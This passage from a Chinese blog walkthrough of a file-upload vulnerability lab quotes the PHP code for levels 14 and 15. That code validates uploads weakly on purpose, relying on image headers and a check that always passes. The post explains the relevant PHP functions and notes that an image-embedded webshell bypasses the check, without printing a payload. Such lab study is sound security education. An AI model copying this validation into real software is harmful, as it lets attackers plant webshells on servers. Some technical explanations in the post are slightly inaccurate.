<h4 id="pass14代码"><a href="#pass14代码" class="headerlink" title="pass14代码:"></a>pass14代码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出这里先是定义了一个函数<br><code>isImage($filename)</code><br>这个函数的作用可以推测是判断文件是否为图片类型，如果是则返回具体类型(.jpg,.png,.git)，如果不是则返回 false. </p>
<p>这其中还有两个函数<code>getimagesize()</code>和<code>image_type_to_extension()</code><br>其中<code>getimagesize()</code>会以数组的形式返回图像的一组信息, 其第二个元素(<code>info[2]</code>)保存的是图片类型. 但是是以数字编码的形式(1,2,3…)保存, 所以需要使用<code>image_type_to_extension($info[2])</code>将数字转为字符串.</p>
<p>程序主体这里出现了几个php脚本预定义的常量</p>
<ul>
<li><code>$_POST</code>可以用来收集来自<code>method = &quot;post&quot;</code>的表单的数据. 表单域的名称会自动成为 <code>$_POST</code> 数组中的键. 所以这里的 <code>&#39;submit&#39;</code>应该是某个表单域的名称.<br>事实上, 通过在浏览器中使用开发者工具分析网页中表单代码:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>请选择要上传的图片：<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"input_file"</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"upload_file"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这应该就是上述的表单, 用来收集上传文件的数据. 而服务器接受到表单的数据后会自动将其中的信息保存在<code>$_POST</code>数组中供脚本调用. </p>
<ul>
<li><p><code>$_FILES</code>POST产生的表单存储在 <code>$_POST</code>中,那么上传的文件的相关信息保存在<code>$_FILES</code>中.<br>其有两个下标.第一个是文件的<code>name</code>, 此处即为表单中的<code>upload_file</code>.第二个则是文件的某些具体参数可以是:”name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：</p>
<ul>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;name&quot;]</code> - 被上传文件的名称</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;type&quot;]</code> - 被上传文件的类型</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;size&quot;]</code> - 被上传文件的大小，以字节计</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;tmp_name&quot;]</code> - 存储在服务器的文件的临时副本的名称</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;error&quot;]</code>- 由文件上传导致的错误代码<h4 id="pass15代码"><a href="#pass15代码" class="headerlink" title="pass15代码:"></a>pass15代码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<p>其他部分大同小异,主要是<code>exif_imagetype(&amp;filename)</code>函数</p>
<blockquote>
<p>本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 <code>$_SERVER[&#39;HTTP_ACCEPT&#39;]</code> 结合使用来检查浏览器是否可以显示某个指定的图像。</p>
</blockquote>
<p>所以只是对第一个字节进行检测, 用pass13的方法即可绕过.</p>
]]></content>
      
        
        <tags>
            
            <tag> php 文件上传漏洞 一句话木马 图片马 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
